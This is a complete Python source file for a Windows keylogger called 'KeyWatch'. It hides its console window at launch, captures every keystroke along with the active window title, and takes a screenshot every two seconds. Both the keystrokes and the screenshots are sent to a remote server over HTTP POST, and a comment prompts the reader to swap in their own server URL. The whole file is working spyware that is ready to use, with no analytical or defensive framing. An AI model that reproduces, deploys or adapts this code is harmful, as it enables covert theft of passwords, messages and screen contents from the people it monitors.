import os
import time
import io
import base64
import threading
import logging
import queue
import requests
import ctypes
import win32gui
from pynput import keyboard
from PIL import ImageGrab

# ─────────────────────────────────────────────
#  CONFIGURATION — update BASE_URL before use
# ─────────────────────────────────────────────
BASE_URL       = "https://keylogger-hwdc.onrender.com/"  # ← Replace with your Render URL
SERVER_URL     = f"{BASE_URL}/log"
SCREENSHOT_URL = f"{BASE_URL}/screenshot"

LOG_DIR  = "keylogger_logs"
LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")

SCREENSHOT_INTERVAL = 2   # seconds between screenshots (set 0 to disable)

# ─────────────────────────────────────────────
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=LOG_FILE,
)

running    = True
send_queue = queue.Queue()


# ── Hide console window ───────────────────────
# Works when run as .py or compiled .exe
# Hides immediately on launch — no visible window
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except Exception:
        pass


# ── Helpers ───────────────────────────────────

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def format_key(key) -> str:
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return str(key).replace("Key.", "")
    except AttributeError:
        return str(key).replace("Key.", "")


# ── Keyboard listener ─────────────────────────

def on_press(key):
    global running
    timestamp    = time.strftime('%Y-%m-%d %H:%M:%S')
    window_title = get_active_window()
    key_str      = format_key(key)

    send_queue.put({
        "timestamp": timestamp,
        "window":    window_title,
        "key":       key_str,
    })

    if key == keyboard.Key.esc:
        running = False
        return False


def on_release(key):
    pass


# ── Network sender thread ─────────────────────
# Runs separately — never blocks keyboard capture

def sender_thread():
    while True:
        try:
            payload = send_queue.get(timeout=1)
            try:
                requests.post(SERVER_URL, json=payload, timeout=5)
            except requests.exceptions.RequestException as e:
                logging.warning(f"Failed to send keystroke: {e}")
            finally:
                send_queue.task_done()
        except queue.Empty:
            if not running:
                break


# ── Screenshot thread ─────────────────────────

def send_screenshot():
    try:
        img = ImageGrab.grab()
        max_width = 1280
        if img.width > max_width:
            ratio = max_width / img.width
            img   = img.resize((max_width, int(img.height * ratio)))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        payload = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "window":    get_active_window(),
            "image":     b64,
        }
        requests.post(SCREENSHOT_URL, json=payload, timeout=10)
        logging.info("Screenshot sent")
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")


def monitor_thread():
    global running
    while running:
        try:
            if SCREENSHOT_INTERVAL > 0:
                send_screenshot()
            time.sleep(SCREENSHOT_INTERVAL if SCREENSHOT_INTERVAL > 0 else 10)
        except Exception as e:
            logging.error(f"Monitor error: {e}")


# ── Entry point ───────────────────────────────

if __name__ == "__main__":
    # Hide console window immediately on launch
    hide_console()

    logging.info("KeyWatch agent started")

    # Sender thread — handles all HTTP calls
    sender = threading.Thread(target=sender_thread, daemon=True)
    sender.start()

    # Monitor thread — screenshots
    monitor = threading.Thread(target=monitor_thread, daemon=True)
    monitor.start()

    # Keyboard listener — blocks until ESC or shutdown
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    logging.info("KeyWatch agent stopped")